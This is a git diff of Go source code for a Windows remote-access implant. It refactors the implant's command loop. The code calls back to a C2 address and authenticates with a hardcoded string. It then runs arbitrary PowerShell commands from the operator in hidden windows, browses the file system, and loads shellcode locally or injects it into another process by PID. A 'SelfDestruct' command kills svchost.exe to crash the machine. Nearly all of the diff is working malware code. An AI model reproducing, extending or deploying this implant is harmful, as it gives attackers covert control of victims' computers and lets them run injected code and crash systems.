@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
+	"strings"
 	"syscall"
 	"time"
 
@@ -37,7 +38,7 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 	}
 	bufferSnapped := buffer[:read_len]
 	bufferStr := string(bufferSnapped)
-	if bufferStr != "AreYouAlive\n" {
+	if bufferStr != "WhoAreYou\n" {
 		os.Exit(1)
 	}
 	reply2Auth(&addr)
@@ -48,41 +49,6 @@ func callHome(c2Address *string, attempts *int) (net.Conn, bool) {
 func reply2Auth(conn *net.Conn) {
 	(*conn).Write([]byte("i_L0V_y0U_Ju5t1n_P3t3R\n"))
 }
-
-func listen4Commands(conn *net.Conn) string {
-	request := make([]byte, 9000)
-	read_len, err := (*conn).Read(request)
-	if read_len == 0 {
-		os.Exit(0)
-	}
-	if err != nil {
-		os.Exit(0)
-	}
-	command := string(request[:read_len])
-	return command
-}
-
-//v1
-// func executeCommands(conn *net.Conn, command *string) {
-// 	if *command == "stop\n" {
-// 		terminate()
-// 	}
-// 	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-// 	ps_instance := exec.Command(powershellPath, "/c", *command)
-// 	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
-// 	output, err := ps_instance.Output()
-// 	if err != nil {
-// 		output = []byte("Couldn't execute the command\n")
-// 		fmt.Println("Couldnt Execute the command")
-// 	}
-// 	(*conn).Write(output)
-// }
-
-// func terminate() {
-// 	fmt.Println("Terminating Implant")
-// 	time.Sleep(1 * time.Second)
-// 	os.Exit(0)
-// }
 
 // v2
 func executeCommands(conn *net.Conn, command *string) {
@@ -161,31 +127,6 @@ func cd(conn *net.Conn, pImplantWD *string) {
 	}
 	(*conn).Write([]byte("OK\n"))
 }
-
-// V1
-// func ls(conn *net.Conn, implantWD *string) {
-// 	dirFS, _ := os.ReadDir(*implantWD)
-// 	dirListing := ""
-// 	for e := range dirFS {
-// 		dirInfo, _ := dirFS[e].Info()
-// 		KBSizeOfDir := dirInfo.Size() / 1000
-// 		dirListing = dirListing + "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
-// 	}
-// 	arrayStr := []byte(dirListing)
-// 	fmt.Println(len(arrayStr))
-// 	(*conn).Write([]byte(dirListing))
-// }
-
-// V2
-// func ls(conn *net.Conn, implantWD *string) {
-// 	dirFS, _ := os.ReadDir(*implantWD)
-// 	dirListing := ""
-// 	for e := range dirFS {
-// 		dirInfo, _ := dirFS[e].Info()
-// 		KBSizeOfDir := dirInfo.Size() / 1000
-// 		dirListing += "	" + fmt.Sprint(KBSizeOfDir) + "	 		" + fmt.Sprint(dirInfo.Mode()) + "	 	" + dirInfo.Name() + "\n"
-// 	}
-// }
 
 // v4 It works. Review this thanks to GPT
 func ls(conn *net.Conn, implantWD *string) {
@@ -266,75 +207,83 @@ func getSC(conn *net.Conn) ([]byte, int) {
 	return sc, 0
 }
 
+func unifiedCommandHandler(conn *net.Conn, implantWD *string) {
+	buffer := make([]byte, 4096)
+	for {
+		n, err := (*conn).Read(buffer)
+		if err != nil {
+			fmt.Println("[-] Connection lost:", err)
+			return
+		}
+		command := strings.TrimSpace(string(buffer[:n]))
+		fmt.Println("[*] Received command:", command)
+
+		switch command {
+		case "ping":
+			(*conn).Write([]byte("pong\n"))
+
+		case "SelfDestruct":
+			ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
+			ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+			output, err := ps_instance.Output()
+			if err != nil {
+				fmt.Println("[-] SelfDestruct failed")
+			}
+			fmt.Println(string(output))
+			(*conn).Write([]byte("NoTime2Die\n"))
+
+		case "cd":
+			cd(conn, implantWD)
+
+		case "ls":
+			ls(conn, implantWD)
+
+		case "pwd":
+			fmt.Println(*implantWD)
+			(*conn).Write([]byte(*implantWD))
+
+		case "barCode":
+			sc, err := getSC(conn)
+			if err == -1 {
+				continue
+			}
+			barCodeLoad(conn, &sc)
+
+		case "remote":
+			buffer := make([]byte, 100)
+			sc, err := getSC(conn)
+			if err == -1 {
+				continue
+			}
+			read_len, er := (*conn).Read(buffer)
+			if er != nil {
+				fmt.Println("[-] Problem Reading into the buffer")
+				(*conn).Write([]byte("Return"))
+				continue
+			}
+			bufferSnapped := buffer[:read_len]
+			(*conn).Write([]byte("OK\n"))
+			pidString := string(bufferSnapped)
+			pidInt, _ := strconv.Atoi(pidString)
+			remoteThread(sc, pidInt)
+
+		default:
+			executeCommands(conn, &command)
+		}
+	}
+}
+
 func main() {
-	c2Address := "192.168.0.102:3333" //Have it encrypted or anything and decode it during runtime
-	attempts := 3
+	c2Address := "192.168.0.102:6199" // Encrypt/decode at runtime in real use
+	attempts := 0
 	implantWD, _ := os.Getwd()
 	fmt.Println("Implant Started")
+
 	conn, result := callHome(&c2Address, &attempts)
 	for !result {
 		conn, result = callHome(&c2Address, &attempts)
 	}
-	for { //Main Program Loop
-		command := listen4Commands(&conn)
-		fmt.Println(command)
-		switch command {
-		case "AreYouAlive\n":
-			reply2Auth(&conn)
-		case "SelfDestruct\n": //This only works if it has admin privs. It is the BSOD.
-			{
-				ps_instance := exec.Command("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "/c", "taskkill.exe", "/f", "/im", "svchost.exe")
-				ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-				output, err := ps_instance.Output()
-				if err != nil {
-					fmt.Println("Couldnt Execute the command")
-				}
-				fmt.Println(output)
-				conn.Write([]byte("NoTime2Die\n"))
-			}
-		case "cd\n":
-			{
-				cd(&conn, &implantWD)
-			}
-		case "ls\n":
-			{
-				ls(&conn, &implantWD)
-			}
-		case "pwd\n":
-			{
-				fmt.Println(implantWD)
-				conn.Write([]byte(implantWD))
-			}
-		case "barCode\n": //This is just typical CreateThread
-			{
-				sc, err := getSC(&conn)
-				if err == -1 {
-					continue
-				}
-				barCodeLoad(&conn, &sc)
-			}
-		case "remote\n":
-			{
-				buffer := make([]byte, 100)
-				sc, err := getSC(&conn)
-				fmt.Println(sc)
-				if err == -1 {
-					continue
-				}
-				read_len, er := conn.Read(buffer)
-				if er != nil {
-					fmt.Println("Problem Reading into the buffer")
-					conn.Write([]byte("Return"))
-					continue
-				}
-				bufferSnapped := buffer[:read_len]
-				conn.Write([]byte("OK\n"))
-				pidString := string(bufferSnapped)
-				pidInt, _ := strconv.Atoi(pidString)
-				remoteThread(sc, pidInt)
-			}
-		default: //TO-DO: turning the default into an error statement and appending all shell commands with a ">.<" to avoid crashes
-			executeCommands(&conn, &command)
-		}
-	}
+	go unifiedCommandHandler(&conn, &implantWD)
+	// Block main from exiting
+	select {}
 }
